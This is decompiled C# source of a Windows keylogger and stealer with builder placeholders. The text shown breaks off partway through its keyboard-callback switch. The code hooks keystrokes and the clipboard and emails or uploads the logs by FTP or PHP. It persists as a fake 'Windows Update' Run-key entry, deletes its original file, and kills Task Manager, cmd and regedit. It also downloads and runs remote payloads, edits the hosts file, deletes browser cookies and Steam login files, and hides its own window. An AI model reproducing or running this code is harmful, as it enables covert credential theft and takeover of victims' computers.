namespace Debugger
{
    using Debugger.My;
    using Debugger.My.Resources;
    using Microsoft.VisualBasic;
    using Microsoft.VisualBasic.CompilerServices;
    using Microsoft.Win32;
    using System;
    using System.ComponentModel;
    using System.Diagnostics;
    using System.Drawing;
    using System.IO;
    using System.IO.Compression;
    using System.Management;
    using System.Net;
    using System.Net.Mail;
    using System.Net.NetworkInformation;
    using System.Net.Sockets;
    using System.Reflection;
    using System.Runtime.CompilerServices;
    using System.Runtime.InteropServices;
    using System.Security.Cryptography;
    using System.Text;
    using System.Threading;
    using System.Windows.Forms;

    [DesignerGenerated]
    public class Debugger : Form
    {
        [AccessedThroughProperty("CH")]
        private Debugger.Clipboard _CH;
        private string appname;
        private bool BackSpace;
        private string binder;
        private KeyboardHookDelegate callback;
        private bool Caps;
        private string CleanedPasswordsMAIL;
        private string CleanedPasswordsWB;
        private string clearff;
        private string clearie;
        private string clip;
        private string CLog;
        private string cmd;
        private IContainer components;
        private string delaytime;
        private string DestructoneString;
        private string DestructthreeStringyear;
        private string DestructtwoString;
        private string DisableSSL;
        private string Downloader;
        private string Downloadlink;
        private string Downloadname;
        private string emailstring;
        private string encryptedemailstring;
        private string encryptedftphost;
        private string encryptedftppass;
        private string encryptedftpuser;
        private string encryptedpassstring;
        private string encryptedphplink;
        private string encryptedsmtpstring;
        private string ExIP;
        private string fakemgrstring;
        private string fakemgrtitle;
        private string fakeMSGholder;
        private string fakerror;
        private string ftphost;
        private string ftppass;
        private string ftpuser;
        private string Holder;
        private string InternalIp;
        private IntPtr KeyboardHandle;
        public string KeyLog;
        private string LastCheckedForegroundTitle;
        private string LHeader;
        private string logger;
        private byte[] Mail;
        private string melt;
        private string meltLocation;
        private byte[] mem;
        private int Minecraftt;
        private string misconfig;
        private string MyAV;
        private string MyFirewall;
        private string notify;
        private string passstring;
        private string path;
        private string phplink;
        private string portstring;
        private string reg;
        private string RHeader;
        private string screeny;
        private int screenynumber;
        private bool Shift;
        private string smtpstring;
        private string spreaders;
        private string startup;
        private string stealers;
        private string steam;
        private string TaskManager;
        private string timerstring;
        private bool UseCaps;
        private string useemail;
        private string useftp;
        private string usephp;
        private byte[] WB;
        private string websiteblocker;
        private string websitevisitor;
        private const short WM_KEYDOWN = 0x100;
        private const int WM_KEYUP = 0x101;
        private const int WM_SYSKEYDOWN = 260;
        private const int WM_SYSKEYUP = 0x105;

        public Debugger()
        {
            base.Load += new EventHandler(this.Form1_Load);
            this.encryptedemailstring = "ReplaceEmailString";
            this.encryptedpassstring = "ReplacePassString";
            this.encryptedsmtpstring = "ReplaceSmtpString";
            this.portstring = "ReplacePortString";
            this.timerstring = "ReplaceTimerString";
            this.fakemgrstring = "ReplaceFakemgrtext";
            this.fakemgrtitle = "ReplaceFaketitletext";
            this.fakeMSGholder = "ReplaceMSGHolder";
            this.encryptedftphost = "ReplaceFtpHost";
            this.encryptedftpuser = "ReplaceFTPUser";
            this.encryptedftppass = "ReplaceFTPPass";
            this.encryptedphplink = "ReplacePHPLink";
            this.DestructoneString = "ReplaceSelf1Destruct";
            this.DestructtwoString = "ReplaceSelf2Destruct";
            this.DestructthreeStringyear = "ReplaceSelf3Destructyear";
            this.useemail = "noemail";
            this.useftp = "noftp";
            this.usephp = "nophp";
            this.delaytime = "0";
            this.clearie = "dontclearie";
            this.clearff = "dontclearff";
            this.binder = "bindfiles";
            this.Downloader = "Disabledownloader";
            this.Downloadname = "Replacedownloadername";
            this.Downloadlink = "Replacedownloaderlink";
            this.websitevisitor = "websitevisitor";
            this.websiteblocker = "websiteblocker";
            this.notify = "Disablenotify";
            this.DisableSSL = "EnableSSL";
            this.fakerror = "Disablefakerror";
            this.startup = "Disablestartup";
            this.screeny = "Disablescreeny";
            this.clip = "Disableclip";
            this.TaskManager = "DisableTaskManager";
            this.logger = "Disablelogger";
            this.stealers = "Disablestealers";
            this.melt = "Disablemelt";
            this.reg = "Disablereg";
            this.cmd = "Disablecmd";
            this.misconfig = "Disablemsconfig";
            this.spreaders = "Disablespreaders";
            this.steam = "Disablesteam";
            this.screenynumber = 1;
            this.Minecraftt = 0x1d4c0;
            this.path = Path.GetTempPath();
            this.meltLocation = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Windows Update.exe";
            this.appname = Path.GetFileName(Application.ExecutablePath);
            this.CLog = string.Empty;
            this.CH = new Debugger.Clipboard();
            this.LHeader = "----[";
            this.RHeader = "]----";
            this.UseCaps = false;
            this.BackSpace = false;
            this.KeyboardHandle = IntPtr.Zero;
            this.LastCheckedForegroundTitle = "";
            this.callback = null;
            this.mem = Debugger.My.Resources.Resources.CMemoryExecute;
            this.InitializeComponent();
        }

        [MethodImpl(MethodImplOptions.NoOptimization | MethodImplOptions.NoInlining)]
        public void addtostartup()
        {
            if (!System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\WindowsUpdate.exe"))
            {
                FileSystem.FileCopy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\WindowsUpdate.exe");
                Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true).SetValue("Windows Update", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\WindowsUpdate.exe", RegistryValueKind.String);
            }
        }

        public string AES_Decrypt(string input, string pass)
        {
            string str;
            RijndaelManaged managed = new RijndaelManaged();
            MD5CryptoServiceProvider provider = new MD5CryptoServiceProvider();
            try
            {
                byte[] destinationArray = new byte[0x20];
                byte[] sourceArray = provider.ComputeHash(Encoding.ASCII.GetBytes(pass));
                Array.Copy(sourceArray, 0, destinationArray, 0, 0x10);
                Array.Copy(sourceArray, 0, destinationArray, 15, 0x10);
                managed.Key = destinationArray;
                managed.Mode = CipherMode.ECB;
                ICryptoTransform transform = managed.CreateDecryptor();
                byte[] inputBuffer = Convert.FromBase64String(input);
                str = Encoding.ASCII.GetString(transform.TransformFinalBlock(inputBuffer, 0, inputBuffer.Length));
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                Exception exception = exception1;
                ProjectData.ClearProjectError();
            }
            return str;
        }

        [DllImport("user32", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
        private static extern int CallNextHookEx(int hHook, int nCode, int wParam, KBDLLHOOKSTRUCT lParam);
        private void CH_Changed(Debugger.Clipboard sender)
        {
            string cLog = this.CLog;
            lock (cLog)
            {
                this.CLog = this.CLog + "[------------" + Conversions.ToString(DateAndTime.TimeOfDay) + "------------]" + Environment.NewLine + MyProject.Computer.Clipboard.GetText() + Environment.NewLine + Environment.NewLine;
            }
        }

        public string DecompressString(string compressedText)
        {
            try
            {
                byte[] buffer = Convert.FromBase64String(compressedText);
                using (MemoryStream stream = new MemoryStream())
                {
                    int num = BitConverter.ToInt32(buffer, 0);
                    stream.Write(buffer, 4, buffer.Length - 4);
                    byte[] array = new byte[(num - 1) + 1];
                    stream.Position = 0L;
                    using (GZipStream stream2 = new GZipStream(stream, CompressionMode.Decompress))
                    {
                        stream2.Read(array, 0, array.Length);
                    }
                    return Encoding.UTF8.GetString(array);
                }
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
            return null;
        }

        public string Decrypt(string encryptedBytes, string secretKey)
        {
            using (MemoryStream stream = new MemoryStream(Convert.FromBase64String(encryptedBytes)))
            {
                RijndaelManaged managed = this.getAlgorithm(secretKey);
                using (CryptoStream stream2 = new CryptoStream(stream, managed.CreateDecryptor(), CryptoStreamMode.Read))
                {
                    byte[] buffer = new byte[((int) (stream.Length - 1L)) + 1];
                    int count = stream2.Read(buffer, 0, (int) stream.Length);
                    return Encoding.Unicode.GetString(buffer, 0, count);
                }
            }
        }

        public string DES_Decrypt(string input, string pass)
        {
            string str2;
            DESCryptoServiceProvider provider = new DESCryptoServiceProvider();
            MD5CryptoServiceProvider provider2 = new MD5CryptoServiceProvider();
            try
            {
                byte[] destinationArray = new byte[8];
                Array.Copy(provider2.ComputeHash(Encoding.Unicode.GetBytes(pass)), 0, destinationArray, 0, 8);
                provider.Key = destinationArray;
                provider.Mode = CipherMode.ECB;
                ICryptoTransform transform = provider.CreateDecryptor();
                byte[] inputBuffer = Convert.FromBase64String(input);
                str2 = Encoding.Unicode.GetString(transform.TransformFinalBlock(inputBuffer, 0, inputBuffer.Length));
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                Exception exception = exception1;
                ProjectData.ClearProjectError();
            }
            return str2;
        }

        public void Disabler()
        {
            while (true)
            {
                if (this.TaskManager != "DisableTaskManager")
                {
                    foreach (Process process in Process.GetProcesses())
                    {
                        if (process.ProcessName == "Taskmgr")
                        {
                            process.Kill();
                        }
                    }
                }
                if (this.TaskManager != "DisableTaskManager")
                {
                    foreach (Process process2 in Process.GetProcesses())
                    {
                        if (process2.ProcessName == "taskmgr")
                        {
                            process2.Kill();
                        }
                    }
                }
                if (this.cmd != "Disablecmd")
                {
                    foreach (Process process3 in Process.GetProcesses())
                    {
                        if (process3.ProcessName == "cmd")
                        {
                            process3.Kill();
                        }
                    }
                }
                if (this.misconfig != "Disablemsconfig")
                {
                    foreach (Process process4 in Process.GetProcesses())
                    {
                        if (process4.ProcessName == "msconfig")
                        {
                            process4.Kill();
                        }
                    }
                }
                if (this.reg != "Disablereg")
                {
                    foreach (Process process5 in Process.GetProcesses())
                    {
                        if (process5.ProcessName == "regedit")
                        {
                            process5.Kill();
                        }
                    }
                }
                if (this.startup != "Disablestartup")
                {
                    this.addtostartup();
                }
                Thread.Sleep(200);
            }
        }

        [DebuggerNonUserCode]
        protected override void Dispose(bool disposing)
        {
            try
            {
                if (disposing && (this.components != null))
                {
                    this.components.Dispose();
                }
            }
            finally
            {
                base.Dispose(disposing);
            }
        }

        public void FakemsgInstall()
        {
            if ((this.fakerror != "Disablefakerror") && (this.appname != (Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\WindowsUpdate.exe")))
            {
                if (this.fakeMSGholder == "MessageBoxIcon.Error")
                {
                    MessageBox.Show(this.fakemgrstring, this.fakemgrtitle, MessageBoxButtons.OK, MessageBoxIcon.Hand);
                }
                else if (this.fakeMSGholder == "MessageBoxIcon.Exclamation")
                {
                    MessageBox.Show(this.fakemgrstring, this.fakemgrtitle, MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                }
                else
                {
                    MessageBox.Show(this.fakemgrstring, this.fakemgrtitle, MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                }
            }
        }

        public void Foldersinstall()
        {
            this.unHide();
            this.unhidden(Conversions.ToString(0x1a));
            this.unhidden(Conversions.ToString(0x1c));
            this.unhidden(Path.GetTempPath());
        }

        public void ForceSteamLogin()
        {
            try
            {
                string str4 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + @"\Steam";
                string path = str4 + @"\config" + @"\SteamAppData.vdf";
                string str2 = str4 + @"\ClientRegistry.blob";
                foreach (Process process in Process.GetProcessesByName("steam"))
                {
                    process.Kill();
                }
                if (System.IO.File.Exists(path))
                {
                    System.IO.File.Delete(path);
                }
                if (System.IO.File.Exists(str2))
                {
                    System.IO.File.Delete(str2);
                }
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                Exception exception = exception1;
                ProjectData.ClearProjectError();
            }
        }

        [MethodImpl(MethodImplOptions.NoOptimization | MethodImplOptions.NoInlining)]
        private void Form1_Load(object sender, EventArgs e)
        {
            Thread.Sleep(Conversions.ToInteger(this.delaytime));
            try
            {
                if ((this.appname != (Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\WindowsUpdate.exe")) && (this.melt != "Disablemelt"))
                {
                    try
                    {
                        if (Application.ExecutablePath != this.meltLocation)
                        {
                            if (System.IO.File.Exists(Path.GetTempPath() + "SysInfo.txt"))
                            {
                                System.IO.File.Delete(Path.GetTempPath() + "SysInfo.txt");
                            }
                            System.IO.File.WriteAllText(Path.GetTempPath() + "SysInfo.txt", Application.ExecutablePath);
                            if (System.IO.File.Exists(this.meltLocation))
                            {
                                System.IO.File.Delete(this.meltLocation);
                            }
                            System.IO.File.Copy(Application.ExecutablePath, this.meltLocation);
                            Process.Start(this.meltLocation);
                            ProjectData.EndApp();
                        }
                        else
                        {
                            Thread.Sleep(500);
                            object obj2 = MyProject.Computer.FileSystem.ReadAllText(Path.GetTempPath() + "SysInfo.txt");
                            MyProject.Computer.FileSystem.DeleteFile(Conversions.ToString(obj2));
                        }
                    }
                    catch (Exception exception1)
                    {
                        ProjectData.SetProjectError(exception1);
                        ProjectData.ClearProjectError();
                    }
                }
                int id = Process.GetCurrentProcess().Id;
                if (System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\pid.txt"))
                {
                    System.IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\pid.txt");
                }
                System.IO.File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\pid.txt", id.ToString());
                if (System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\pidloc.txt"))
                {
                    System.IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\pidloc.txt");
                }
                System.IO.File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\pidloc.txt", Application.ExecutablePath);
                this.emailstring = this.Decrypt(this.encryptedemailstring, "EncryptedCredentials");
                this.passstring = this.Decrypt(this.encryptedpassstring, "EncryptedCredentials");
                this.smtpstring = this.Decrypt(this.encryptedsmtpstring, "EncryptedCredentials");
                this.ftphost = this.Decrypt(this.encryptedftphost, "EncryptedCredentials");
                this.ftpuser = this.Decrypt(this.encryptedftpuser, "EncryptedCredentials");
                this.ftppass = this.Decrypt(this.encryptedftppass, "EncryptedCredentials");
                this.phplink = this.Decrypt(this.encryptedphplink, "EncryptedCredentials");
                if (this.IsConnectedToInternet())
                {
                    try
                    {
                        this.InternalIp = this.GetInternalIP();
                        this.ExIP = this.GetExternalIP();
                    }
                    catch (Exception exception5)
                    {
                        ProjectData.SetProjectError(exception5);
                        Exception exception = exception5;
                        ProjectData.ClearProjectError();
                    }
                }
                try
                {
                    this.MyAV = this.GetAntiVirus();
                    this.MyFirewall = this.GetFirewall();
                }
                catch (Exception exception6)
                {
                    ProjectData.SetProjectError(exception6);
                    Exception exception2 = exception6;
                    ProjectData.ClearProjectError();
                }
                Thread thread = new Thread(new ThreadStart(this.FakemsgInstall));
                thread.SetApartmentState(ApartmentState.STA);
                thread.Start();
                Thread thread3 = new Thread(new ThreadStart(this.Foldersinstall));
                thread3.SetApartmentState(ApartmentState.STA);
                thread3.Start();
                Thread thread2 = new Thread(new ThreadStart(this.ServerInstall));
                thread2.SetApartmentState(ApartmentState.STA);
                thread2.Start();
                if (this.stealers != "Disablestealers")
                {
                    if (this.IsConnectedToInternet())
                    {
                        new Thread(new ThreadStart(this.StartStealers)).Start();
                    }
                    new Thread(new ThreadStart(this.Minecraftsub)).Start();
                }
                Thread thread4 = new Thread(new ThreadStart(this.Disabler));
                thread4.SetApartmentState(ApartmentState.STA);
                thread4.Start();
                if (this.logger != "Disablelogger")
                {
                    this.LHeader = "[";
                    this.RHeader = "]";
                    this.HookKeyboard();
                    this.UseCaps = true;
                    if (this.useftp != "noftp")
                    {
                        Thread thread7 = new Thread(new ThreadStart(this.SendLogsFTP));
                        thread7.SetApartmentState(ApartmentState.STA);
                        thread7.Start();
                    }
                    else if (this.usephp != "nophp")
                    {
                        Thread thread8 = new Thread(new ThreadStart(this.SendLogsPHP));
                        thread8.SetApartmentState(ApartmentState.STA);
                        thread8.Start();
                    }
                    else
                    {
                        Thread thread9 = new Thread(new ThreadStart(this.SendLogs));
                        thread9.SetApartmentState(ApartmentState.STA);
                        thread9.Start();
                    }
                }
                if (this.clip != "Disableclip")
                {
                    this.CH.Install();
                }
                if (this.appname != (Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\WindowsUpdate.exe"))
                {
                    if (this.binder != "bindfiles")
                    {
                        int num2 = 0;
                        foreach (string str in Strings.Split(this.binder, "BSPLIT2", -1, CompareMethod.Binary))
                        {
                            if (!string.IsNullOrEmpty(str.Trim()))
                            {
                                try
                                {
                                    num2++;
                                    string[] strArray = Strings.Split(str, "BSPLIT1", -1, CompareMethod.Binary);
                                    byte[] bytes = Convert.FromBase64String(strArray[0]);
                                    string str2 = strArray[1];
                                    if (str2 == ".exe")
                                    {
                                        System.IO.File.WriteAllBytes(Path.GetTempPath() + "EBFile_" + Conversions.ToString(num2) + str2, bytes);
                                        Process.Start(Path.GetTempPath() + "EBFile_" + Conversions.ToString(num2) + str2);
                                    }
                                    else
                                    {
                                        System.IO.File.WriteAllBytes(Path.GetTempPath() + "BFile_" + Conversions.ToString(num2) + str2, bytes);
                                        Process.Start(Path.GetTempPath() + "BFile_" + Conversions.ToString(num2) + str2);
                                    }
                                }
                                catch (Exception exception7)
                                {
                                    ProjectData.SetProjectError(exception7);
                                    Exception exception3 = exception7;
                                    ProjectData.ClearProjectError();
                                }
                            }
                        }
                    }
                    if (this.IsConnectedToInternet())
                    {
                        if (this.Downloader != "Disabledownloader")
                        {
                            MyProject.Computer.Network.DownloadFile(this.Downloadlink, Path.GetTempPath() + this.Downloadlink);
                            Process.Start(Path.GetTempPath() + this.Downloadname);
                        }
                        if (this.IsConnectedToInternet() && (this.websitevisitor != "websitevisitor"))
                        {
                            foreach (string str3 in Strings.Split(this.websitevisitor, "||", -1, CompareMethod.Binary))
                            {
                                if (!string.IsNullOrEmpty(str3.Trim()))
                                {
                                    try
                                    {
                                        Process.Start("http://" + str3);
                                    }
                                    catch (Exception exception8)
                                    {
                                        ProjectData.SetProjectError(exception8);
                                        ProjectData.ClearProjectError();
                                    }
                                }
                            }
                        }
                    }
                    if ((this.clearie != "dontclearie") && Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Cookies)))
                    {
                        foreach (string str4 in Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Cookies)))
                        {
                            try
                            {
                                System.IO.File.Delete(str4);
                            }
                            catch (Exception exception9)
                            {
                                ProjectData.SetProjectError(exception9);
                                ProjectData.ClearProjectError();
                            }
                        }
                    }
                    if ((this.clearff != "dontclearff") && Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Mozilla\Firefox\Profiles"))
                    {
                        foreach (string str5 in MyProject.Computer.FileSystem.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Mozilla\Firefox\Profiles"))
                        {
                            foreach (string str6 in MyProject.Computer.FileSystem.GetFiles(str5))
                            {
                                if (str6.Contains("cookie"))
                                {
                                    try
                                    {
                                        System.IO.File.Delete(str6);
                                    }
                                    catch (Exception exception10)
                                    {
                                        ProjectData.SetProjectError(exception10);
                                        ProjectData.ClearProjectError();
                                    }
                                }
                            }
                        }
                        foreach (string str7 in Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Mozilla\Firefox\Profiles"))
                        {
                            if (str7.Contains("cookie"))
                            {
                                try
                                {
                                    System.IO.File.Delete(str7);
                                }
                                catch (Exception exception11)
                                {
                                    ProjectData.SetProjectError(exception11);
                                    ProjectData.ClearProjectError();
                                }
                            }
                        }
                    }
                    if (this.websiteblocker != "websiteblocker")
                    {
                        try
                        {
                            string path = Environment.GetFolderPath(Environment.SpecialFolder.System) + @"\drivers\etc\hosts";
                            string str8 = System.IO.File.ReadAllText(path);
                            foreach (string str10 in Strings.Split(this.websiteblocker, "||", -1, CompareMethod.Binary))
                            {
                                if (!str8.Contains(str10))
                                {
                                    System.IO.File.AppendAllText(path, Environment.NewLine + "127.0.0.1 " + str10);
                                }
                            }
                        }
                        catch (Exception exception12)
                        {
                            ProjectData.SetProjectError(exception12);
                            ProjectData.ClearProjectError();
                        }
                    }
                    if (this.steam != "Disablesteam")
                    {
                        this.ForceSteamLogin();
                    }
                    if (this.spreaders != "Disablespreaders")
                    {
                        Thread thread10 = new Thread(new ThreadStart(this.Spread));
                        thread10.SetApartmentState(ApartmentState.STA);
                        thread10.Start();
                    }
                }
            }
            catch (Exception exception13)
            {
                ProjectData.SetProjectError(exception13);
                Interaction.MsgBox(exception13.ToString(), MsgBoxStyle.OkOnly, null);
                ProjectData.ClearProjectError();
            }
        }

        public string GetActiveWindowTitle()
        {
            string str;
            try
            {
                string lpString = new string('\0', 100);
                GetWindowText(GetForegroundWindow(), ref lpString, 100);
                str = lpString.Substring(0, Strings.InStr(lpString, "\0", CompareMethod.Binary) - 1);
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                str = "";
                ProjectData.ClearProjectError();
            }
            return str;
        }

        private RijndaelManaged getAlgorithm(string secretKey)
        {
            RijndaelManaged managed;
            Rfc2898DeriveBytes bytes = new Rfc2898DeriveBytes(secretKey, Encoding.Unicode.GetBytes("099u787978786"));
            return new RijndaelManaged { KeySize = 0x100, IV = bytes.GetBytes((int) Math.Round((double) (((double) managed.BlockSize) / 8.0))), Key = bytes.GetBytes((int) Math.Round((double) (((double) managed.KeySize) / 8.0))), Padding = PaddingMode.PKCS7 };
        }

        public string GetAntiVirus()
        {
            string str;
            try
            {
                string str2 = null;
                ManagementObjectCollection objects = new ManagementObjectSearcher(@"\\" + Environment.MachineName + @"\root\SecurityCenter2", "SELECT * FROM AntivirusProduct").Get();
                foreach (ManagementObject obj2 in objects)
                {
                    str2 = obj2["displayName"].ToString();
                }
                str = str2;
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                Exception exception = exception1;
                ProjectData.ClearProjectError();
            }
            return str;
        }

        [DllImport("user32", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
        private static extern int GetAsyncKeyState(int vKey);
        public string GetBetween(string Source, string Before, string After)
        {
            int startIndex = Source.IndexOf(Before, 0) + Before.Length;
            if ((startIndex - Before.Length) == -1)
            {
                return string.Empty;
            }
            int index = Source.IndexOf(After, startIndex);
            if (index == -1)
            {
                return string.Empty;
            }
            return Source.Substring(startIndex, index - startIndex);
        }

        public string GetExternalIP()
        {
            return this.GetBetween(new WebClient().DownloadString("http://whatismyipaddress.com/"), "<!-- do not script -->", "<!-- do not script -->").Replace("&#46;", ".").Trim();
        }

        public string GetFirewall()
        {
            string str;
            try
            {
                string str2 = null;
                ManagementObjectCollection objects = new ManagementObjectSearcher(@"\\" + Environment.MachineName + @"\root\SecurityCenter2", "SELECT * FROM FirewallProduct").Get();
                foreach (ManagementObject obj2 in objects)
                {
                    str2 = obj2["displayName"].ToString();
                }
                str = str2;
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                Exception exception = exception1;
                ProjectData.ClearProjectError();
            }
            return str;
        }

        [DllImport("user32.dll", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
        private static extern int GetForegroundWindow();
        public string GetInternalIP()
        {
            foreach (IPAddress address in Dns.GetHostEntry(Dns.GetHostName()).AddressList)
            {
                if (address.AddressFamily == AddressFamily.InterNetwork)
                {
                    return address.ToString();
                }
            }
            return null;
        }

        [DllImport("user32.dll", EntryPoint="GetWindowTextA", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
        private static extern int GetWindowText(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);
        private object Hooked()
        {
            object obj2;
            try
            {
                obj2 = this.KeyboardHandle != IntPtr.Zero;
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                obj2 = "";
                ProjectData.ClearProjectError();
            }
            return obj2;
        }

        public void HookKeyboard()
        {
            try
            {
                this.callback = new KeyboardHookDelegate(this.KeyboardCallback);
                this.KeyboardHandle = (IntPtr) SetWindowsHookEx(13, this.callback, (int) Process.GetCurrentProcess().MainModule.BaseAddress, 0);
                bool flag1 = this.KeyboardHandle != IntPtr.Zero;
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
        }

        [DebuggerStepThrough]
        private void InitializeComponent()
        {
            this.SuspendLayout();
            SizeF ef2 = new SizeF(6f, 13f);
            this.AutoScaleDimensions = ef2;
            this.AutoScaleMode = AutoScaleMode.Font;
            Size size2 = new Size(0x4c, 0x2e);
            this.ClientSize = size2;
            this.FormBorderStyle = FormBorderStyle.None;
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.Name = "Debugger";
            this.Opacity = 0.0;
            this.ShowIcon = false;
            this.ShowInTaskbar = false;
            this.Text = "Debugger";
            this.WindowState = FormWindowState.Minimized;
            this.ResumeLayout(false);
        }

        public bool IsConnectedToInternet()
        {
            foreach (NetworkInterface interface2 in NetworkInterface.GetAllNetworkInterfaces())
            {
                if ((interface2.NetworkInterfaceType != NetworkInterfaceType.Loopback) && (interface2.OperationalStatus == OperationalStatus.Up))
                {
                    return true;
                }
            }
            return false;
        }

        private object IsDotNet(byte[] Bytes)
        {
            object obj2;
            try
            {
                MethodInfo entryPoint = Assembly.Load(Bytes).EntryPoint;
                obj2 = true;
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                obj2 = false;
                ProjectData.ClearProjectError();
            }
            return obj2;
        }

        public int KeyboardCallback(int Code, int wParam, ref KBDLLHOOKSTRUCT lParam)
        {
            int num;
            try
            {
                string str2;
                object activeWindowTitle = this.GetActiveWindowTitle();
                if (Operators.ConditionalCompareObjectNotEqual(activeWindowTitle, this.LastCheckedForegroundTitle, false))
                {
                    this.LastCheckedForegroundTitle = Conversions.ToString(activeWindowTitle);
                    this.KeyLog = Conversions.ToString(Operators.ConcatenateObject(this.KeyLog, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("\r\n\r\n" + this.LHeader, activeWindowTitle), " - "), DateAndTime.Now.ToString()), this.RHeader), "\r\n")));
                }
                string str = "";
                if (!((wParam == 0x100) | (wParam == 260)))
                {
                    goto Label_0A22;
                }
                if ((Code >= 0) && ((MyProject.Computer.Keyboard.CtrlKeyDown & MyProject.Computer.Keyboard.AltKeyDown) & (lParam.vkCode == 0x53)))
                {
                    return 1;
                }
                switch (lParam.vkCode)
                {
                    case 8:
                        if (!(this.KeyLog.EndsWith(this.RHeader + "\r\n") | !this.BackSpace))
                        {
                            goto Label_068F;
                        }
                        str = "[BS]";
                        goto Label_0A8D;

                    case 9:
                        str = "\t";
                        goto Label_0A8D;

                    case 13:
                        str = "\r\n";
                        goto Label_0A8D;

                    case 20:
                        if (!this.UseCaps)
                        {
                            goto Label_05EA;
                        }
                        if (!MyProject.Computer.Keyboard.CapsLock)
                        {
                            goto Label_05DE;
                        }
                        this.Caps = false;
                        goto Label_0A8D;

                    case 0x1b:
                        str = " [esc] ";
                        goto Label_0A8D;

                    case 0x20:
                        str = " ";
                        goto Label_0A8D;

                    case 0x25:
                        str = "[<]";
                        goto Label_0A8D;

                    case 0x26:
                        str = "[^]";
                        goto Label_0A8D;

                    case 0x27:
                        str = "[>]";
                        goto Label_0A8D;

                    case 40:
                        str = "[V]";
                        goto Label_0A8D;

                    case 0x2e:
                        str = " [del] ";
                        goto Label_0A8D;

                    case 0x30:
                    case 0x31:
                    case 50:
                    case 0x33:
                    case 0x34:
                    case 0x35:
                    case 0x36:
                    case 0x37:
                    case 0x38:
                    case 0x39:
                        if (!this.Shift)
                        {
                            goto Label_04E4;
                        }
                        str = Conversions.ToString(Strings.ChrW(lParam.vkCode));
                        if (str != "1")
                        {
                            goto Label_03F7;
                        }
                        str = "!";
                        goto Label_0A8D;

                    case 0x41:
                    case 0x42:
                    case 0x43:
                    case 0x44:
                    case 0x45:
                    case 70:
                    case 0x47:
                    case 0x48:
                    case 0x49:
                    case 0x4a:
                    case 0x4b:
                    case 0x4c:
                    case 0x4d:
                    case 0x4e:
                    case 0x4f:
                    case 80:
                    case 0x51:
                    case 0x52:
                    case 0x53:
                    case 0x54:
                    case 0x55:
                    case 0x56:
                    case 0x57:
                    case 0x58:
                    case 0x59:
                    case 90:
                        if (!(this.Shift | this.Caps))
                        {
                            goto Label_0529;
                        }
                        str = Conversions.ToString(Strings.ChrW(lParam.vkCode + 0x20)).ToUpper();
                        goto Label_0A8D;

                    case 0x60:
                    case 0x61:
                    case 0x62:
                    case 0x63:
                    case 100:
                    case 0x65:
                    case 0x66:
                    case 0x67:
                    case 0x68:
                    case 0x69:
                        str = Conversions.ToString(Strings.ChrW(lParam.vkCode));
                        switch (str)
                        {
                            case "a":
                                str = Conversions.ToString(1);
                                break;

                            case "b":
                                str = Conversions.ToString(2);
                                break;

                            case "c":
                                str = Conversions.ToString(3);
                                break;

                            case "d":
                                str = Conversions.ToString(4);
                                break;

                            case "e":
                                str = Conversions.ToString(5);
                                break;

                            case "f":
                                str = Conversions.ToString(6);
                                break;

                            case "g":
                                str = Conversions.ToString(7);
                                break;

                            case "h":
                                str = Conversions.ToString(8);
                                break;

                            case "i":
                                str = Conversions.ToString(9);
                                break;

                            case "`":
                                str = Conversions.ToString(0);
                                break;
                        }
                        goto Label_0A8D;

                    case 0x6d:
                    case 0xbd:
                        if (!this.Shift)
                        {
                            goto Label_0727;
                        }
                        str = "_";
                        goto Label_0A8D;

                    case 110:
                    case 190:
                        if (this.Shift)
                        {
                            goto Label_0709;
                        }
                        str = ".";
                        goto Label_0A8D;

                    case 0x70:
                    case 0x71:
                    case 0x72:
                    case 0x73:
                    case 0x74:
                    case 0x75:
                    case 0x76:
                    case 0x77:
                    case 120:
                    case 0x79:
                    case 0x7a:
                    case 0x7b:
                    case 0x7c:
